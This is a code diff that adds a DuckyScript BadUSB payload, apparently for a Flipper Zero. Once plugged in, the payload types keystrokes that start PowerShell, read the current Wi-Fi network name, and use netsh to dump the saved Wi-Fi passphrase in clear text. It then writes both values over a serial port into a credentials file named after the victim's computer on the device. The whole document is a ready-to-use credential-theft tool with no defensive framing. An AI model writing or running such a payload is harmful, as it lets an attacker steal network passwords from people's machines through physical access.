@@ -1,0 +1,23 @@
+GUI r
+
+DELAY 200
+
+STRING powershell -NoP -NonI
+
+ENTER
+
+DELAY 1500
+
+STRING $SSID = (get-netconnectionProfile).Name.split()[0];
+
+STRING $PASSPHRASE = $((netsh.exe wlan show profiles name=`"$SSID`" key=clear | Select-String -pattern ".*Key Content.*:(.*)" -allmatches) -split ":")[1].Trim();
+
+STRING $SUSB="USB\VID_0483&PID_5740";
+
+STRING $SPATH="/ext/apps_data/wifi_creds/$env:computername.txt";
+
+REM ## Perform 600 loops, to check if Flipper storage is available, if not wait 1 sec.
+
+STRING 1..600 | % { Try { $serialPort = New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID "$SUSB*" -ErrorAction SilentlyContinue) -split "COM")[1][0])", 115200, 'None', 8, 'one'); $serialPort.open(); $serialPort.Write("storage write $SPATH `r`n"); $serialPort.Write("SSID: `"$SSID`""); $serialPort.Write("`n"); $serialPort.Write("PASSPHRASE: `"$PASSPHRASE`""); $serialPort.Write("$([char] 3)"); $serialPort.Close(); exit }Catch { Sleep 1 } }
+
+ENTER
